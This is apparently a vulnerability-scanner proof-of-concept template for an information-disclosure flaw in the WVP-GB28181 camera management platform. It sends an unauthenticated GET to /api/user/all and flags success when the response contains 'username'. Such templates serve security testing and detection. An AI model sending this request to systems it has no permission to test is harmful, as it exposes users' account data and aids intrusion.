{
        'name': 'WVP-GB28181摄像头管理平台 user 信息泄露漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/api/user/all',
            'headers': {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Type': 'application/xml'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': 'username'
        }}]
    }